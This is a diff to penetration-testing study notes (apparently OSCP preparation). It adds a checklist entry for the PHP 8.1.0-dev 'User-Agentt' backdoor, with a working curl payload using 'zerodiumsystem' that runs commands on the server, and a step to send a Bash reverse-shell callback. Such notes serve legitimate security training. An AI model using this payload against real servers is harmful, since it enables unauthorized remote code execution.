@@ -181,7 +181,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+- [[OSCP/MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
@@ -189,3 +189,14 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source archive review, custom upload analysis, and filename command injection
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- homepage-led parameter discovery, LFI confirmation, and application file-list review
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- WordPress-aware plugin discovery and controlled RFI-to-RCE validation
+
+### `X-Powered-By` discloses PHP/8.1.0-dev
+→ Save the headers and confirm the exact development-build string with `curl -sSI`
+→ Test the harmless identity request with the misspelled `User-Agentt` header:
+```bash
+curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
+  "http://$BoxIP:$WebPort/" | grep -m1 'uid='
+```
+→ If `uid=` is returned, start a listener and send the Bash callback through the same header
+→ Go to [[RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]], then [[RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]
+→ See [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] and [[Web Applications#PHP 8.1.0-dev `User-Agentt` backdoor|Command Appendix]]
